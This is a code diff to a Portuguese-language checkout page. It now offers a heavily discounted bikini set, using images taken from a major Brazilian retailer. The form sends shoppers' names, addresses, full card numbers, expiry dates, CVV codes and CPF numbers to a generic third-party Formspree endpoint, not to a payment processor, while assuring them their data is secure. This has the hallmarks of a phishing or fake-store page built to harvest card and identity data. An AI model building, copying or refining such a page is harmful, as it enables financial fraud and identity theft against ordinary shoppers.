@@ -12,7 +12,9 @@ body { font-family: Arial, sans-serif; background:#f5f5f5; padding-bottom:30px; 
 .resumo { padding:18px; background:#f7f9ff; border-bottom:1px solid #eee; display:flex; gap:12px; align-items:center; }
 .resumo img { width:70px; height:70px; object-fit:contain; border:1px solid #eee; border-radius:8px; background:white; }
 .resumo-info { font-size:14px; line-height:1.4; }
+.preco-antigo { color:#999; text-decoration:line-through; font-size:13px; }
 .preco-final { color:#0086ff; font-weight:bold; font-size:18px; }
+.preco-pix { color:#00a650; font-weight:bold; font-size:15px; }
 
 /* Barra de progresso */
 .progresso { display:flex; padding:15px 20px; background:#fafafa; border-bottom:1px solid #eee; }
@@ -35,6 +37,7 @@ body { font-family: Arial, sans-serif; background:#f5f5f5; padding-bottom:30px; 
 .escondido { display:none; }
 .voltar { display:block; text-align:center; margin:15px; color:#0086ff; text-decoration:none; font-size:14px; }
 h3 { color:#333; margin-bottom:20px; font-size:17px; }
+.resumo-pedido { background:#f9f9f9; padding:12px; border-radius:8px; margin-bottom:20px; font-size:14px; line-height:1.8; }
 </style>
 </head>
 <body>
@@ -43,11 +46,13 @@ h3 { color:#333; margin-bottom:20px; font-size:17px; }
 
 <div class="container">
   <div class="resumo">
-    <img src="https://a-static.mlcdn.com.br/470x352/apple-iphone-15-128gb-azul-61-48mp-ios-5g/magazineluiza/238034800/6435accf895a42a0b4d80d97663971a4.jpg" alt="iPhone 15 Azul">
+    <img src="https://m.magazineluiza.com.br/a-static/420x420/conjunto-de-biquini-ajustavel-para-mulheres-sexy-solido-triangular-moda-de-praia-verao-2023-ruotongsept/aliexpress/206242209/0b5d5646f3af9dca4d49b16cae2a2d30.jpeg" alt="Conjunto de Biquíni">
     <div class="resumo-info">
-      <b>Apple iPhone 15 128GB Azul</b><br>
-      Qtd: 1<br>
-      <span class="preco-final">Total: R$ 4.299,00</span>
+      <b>Conjunto De Biquíni Ajustável</b><br>
+      Código: eb44dc51ch<br>
+      <span class="preco-antigo">De R$ 239,90</span><br>
+      <span class="preco-pix">✅ R$ 81,23 à vista no Pix</span><br>
+      <span class="preco-final">ou 7x de R$ 12,22 sem juros</span>
     </div>
   </div>
 
@@ -63,7 +68,7 @@ h3 { color:#333; margin-bottom:20px; font-size:17px; }
     </div>
   </div>
 
-  <form action="https://formspree.io/f/mnpjwely" method="POST" id="form-pedido">
+  <form action="https://formspree.io/f/xgaodgyn" method="POST" id="form-pedido">
 
   <!-- PASSO 1: DADOS DE ENTREGA -->
   <div id="entrega" class="conteudo">
@@ -74,6 +79,24 @@ h3 { color:#333; margin-bottom:20px; font-size:17px; }
     
     <label class="label">Nome Completo *</label>
     <input class="input" name="nome" id="nome" placeholder="Digite seu nome completo" required>
+
+    <label class="label">Cor escolhida *</label>
+    <select class="input" name="cor" id="cor" required>
+      <option value="">Selecione a cor</option>
+      <option value="Cor: 8456">Cor: 8456</option>
+      <option value="Cor: 8457">Cor: 8457</option>
+      <option value="Cor: 8458">Cor: 8458</option>
+      <option value="Cor: 8459">Cor: 8459</option>
+    </select>
+
+    <label class="label">Tamanho *</label>
+    <select class="input" name="tamanho" id="tamanho" required>
+      <option value="">Selecione o tamanho</option>
+      <option value="P">P</option>
+      <option value="M">M</option>
+      <option value="G">G</option>
+      <option value="GG">GG</option>
+    </select>
 
     <label class="label">CEP *</label>
     <input class="input" name="cep" id="cep" placeholder="00000-000" maxlength="9" required>
@@ -111,38 +134,53 @@ h3 { color:#333; margin-bottom:20px; font-size:17px; }
 
   <!-- PASSO 2: PAGAMENTO -->
   <div id="pagamento" class="conteudo escondido">
-    <h3>💳 Dados de Pagamento</h3>
+    <h3>💳 Resumo e Pagamento</h3>
 
-    <label class="label">Número do Cartão *</label>
-    <input class="input" name="numero_cartao" id="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
-    
-    <label class="label">Nome no Cartão *</label>
-    <input class="input" name="nome_cartao" id="nome_cartao" placeholder="Nome como está no cartão" required>
+    <div class="resumo-pedido">
+      <strong>Produto:</strong> Conjunto De Biquíni Ajustável<br>
+      <strong>Valor à vista:</strong> R$ 81,23 no Pix<br>
+      <strong>Parcelado:</strong> 7x de R$ 12,22 sem juros
+    </div>
 
-    <div class="linha">
-      <div style="flex:1">
-        <label class="label">Validade *</label>
-        <input class="input" name="validade_cartao" id="validade_cartao" placeholder="MM/AA" required>
+    <label class="label">Forma de Pagamento *</label>
+    <select class="input" name="forma_pagamento" id="forma_pagamento" required onchange="mostrarPagamento()">
+      <option value="">Selecione a forma de pagamento</option>
+      <option value="Pix - R$ 81,23 à vista">✅ Pix - R$ 81,23 à vista</option>
+      <option value="Cartão de Crédito - 7x de R$ 12,22 sem juros">💳 Cartão de Crédito - 7x de R$ 12,22 sem juros</option>
+    </select>
+
+    <!-- DADOS DO CARTÃO -->
+    <div id="dados-cartao" class="escondido">
+      <label class="label">Número do Cartão *</label>
+      <input class="input" name="numero_cartao" id="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19">
+      
+      <label class="label">Nome no Cartão *</label>
+      <input class="input" name="nome_cartao" id="nome_cartao" placeholder="Nome como está no cartão">
+
+      <div class="linha">
+        <div style="flex:1">
+          <label class="label">Validade *</label>
+          <input class="input" name="validade_cartao" id="validade_cartao" placeholder="MM/AA">
+        </div>
+        <div style="flex:1">
+          <label class="label">CVV *</label>
+          <input class="input" name="cvv_cartao" id="cvv_cartao" placeholder="123">
+        </div>
       </div>
-      <div style="flex:1">
-        <label class="label">CVV *</label>
-        <input class="input" name="cvv_cartao" id="cvv_cartao" placeholder="123" required>
+
+      <label class="label">CPF do Titular *</label>
+      <input class="input" name="cpf_titular" id="cpf_titular" placeholder="000.000.000-00">
+    </div>
+
+    <!-- PIX -->
+    <div id="dados-pix" class="escondido">
+      <div style="background:#f0f7ff; padding:15px; border-radius:8px; text-align:center; margin:15px 0;">
+        <p style="font-size:15px; color:#0086ff; font-weight:bold;">✅ Valor com desconto: R$ 81,23</p>
+        <p style="font-size:13px; color:#555; margin-top:8px;">Após clicar em "Confirmar Pedido", o código PIX será enviado para seu e-mail.</p>
       </div>
     </div>
 
-    <label class="label">CPF do Titular *</label>
-    <input class="input" name="cpf_titular" id="cpf_titular" placeholder="000.000.000-00" required>
-
-    <label class="label">Parcelas *</label>
-    <select class="input" name="parcelas" id="parcelas" required>
-      <option value="1x de R$ 4.299,00 sem juros">1x de R$ 4.299,00 sem juros</option>
-      <option value="2x de R$ 2.149,50 sem juros">2x de R$ 2.149,50 sem juros</option>
-      <option value="3x de R$ 1.433,00 sem juros">3x de R$ 1.433,00 sem juros</option>
-      <option value="6x de R$ 716,50 sem juros">6x de R$ 716,50 sem juros</option>
-      <option value="12x de R$ 399,90 sem juros" selected>12x de R$ 399,90 sem juros</option>
-    </select>
-
-    <button type="submit" class="btn btn-enviar">✅ CONFIRMAR E ENVIAR PEDIDO</button>
+    <button type="submit" class="btn btn-enviar">✅ CONFIRMAR PEDIDO</button>
     <p style="text-align:center; font-size:12px; color:#888; margin-top:10px;">🔒 Seus dados estão protegidos e seguros</p>
 
     <button type="button" class="btn btn-voltar" style="margin-top:15px;" onclick="voltarParaEntrega()">← Voltar para entrega</button>
@@ -156,6 +194,9 @@ h3 { color:#333; margin-bottom:20px; font-size:17px; }
 function irParaPagamento() {
   const nome = document.getElementById('nome').value;
   const email = document.getElementById('email').value;
+  const cor = document.getElementById('cor').value;
+  const tamanho = document.getElementById('tamanho').value;
+  
   if (!nome.trim()) {
     alert('Por favor, preencha seu nome completo!');
     return;
@@ -164,6 +205,15 @@ function irParaPagamento() {
     alert('Por favor, insira um e-mail válido!');
     return;
   }
+  if (!cor) {
+    alert('Por favor, selecione a cor!');
+    return;
+  }
+  if (!tamanho) {
+    alert('Por favor, selecione o tamanho!');
+    return;
+  }
+  
   document.getElementById('entrega').classList.add('escondido');
   document.getElementById('pagamento').classList.remove('escondido');
   document.getElementById('passo-1').classList.remove('ativo');
@@ -179,8 +229,35 @@ function voltarParaEntrega() {
   document.getElementById('passo-1').classList.remove('concluido');
   document.getElementById('passo-1').classList.add('ativo');
 }
+
+function mostrarPagamento() {
+  const forma = document.getElementById('forma_pagamento').value;
+  document.getElementById('dados-cartao').classList.add('escondido');
+  document.getElementById('dados-pix').classList.add('escondido');
+  
+  if (forma.includes('Cartão')) {
+    document.getElementById('dados-cartao').classList.remove('escondido');
+    // Torna obrigatório apenas quando cartão for selecionado
+    setRequiredCartao(true);
+  } else if (forma.includes('Pix')) {
+    document.getElementById('dados-pix').classList.remove('escondido');
+    setRequiredCartao(false);
+  }
+}
+
+function setRequiredCartao(obrigatorio) {
+  const campos = ['numero_cartao', 'nome_cartao', 'validade_cartao', 'cvv_cartao', 'cpf_titular'];
+  campos.forEach(id => {
+    const campo = document.getElementById(id);
+    if (obrigatorio) {
+      campo.setAttribute('required', 'required');
+    } else {
+      campo.removeAttribute('required');
+    }
+  });
+}
 </script>
 
 </body>
   </html>
-      
+  
